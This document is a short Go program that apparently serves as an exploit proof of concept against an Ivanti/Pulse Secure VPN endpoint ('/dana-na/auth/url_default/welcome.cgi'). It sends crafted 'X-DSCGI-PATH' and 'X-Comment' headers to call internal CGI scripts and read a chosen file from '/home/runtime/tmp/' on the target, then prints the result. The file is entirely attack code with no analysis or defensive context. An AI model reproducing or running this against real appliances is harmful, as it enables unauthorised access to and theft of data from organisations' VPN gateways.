package main

import (
    "io"
    "net/http"
    "os"
    "strings"
    "time"
)

func main() {
    endpoint := strings.TrimRight(os.Args[1], "/") + "/dana-na/auth/url_default/welcome.cgi"
    client := &http.Client{Timeout: 10 * time.Second}
    request, _ := http.NewRequest("GET", endpoint, nil)
    request.Header.Set("X-DSCGI-PATH", "/home/webserver/htdocs/dana/fb/smb/wu.cgi")
    response, err := client.Do(request)
    if err != nil {
        panic(err)
    }
    response.Body.Close()
    request, _ = http.NewRequest("GET", endpoint, nil)
    request.Header.Set("x-dscgi-path", "/safe/status.cgi")
    request.Header.Set("X-Comment", "/home/runtime/tmp/" + os.Args[2])
    response, err = client.Do(request)
    if err != nil {
        panic(err)
    }
    io.Copy(os.Stdout, response.Body)
    response.Body.Close()
}
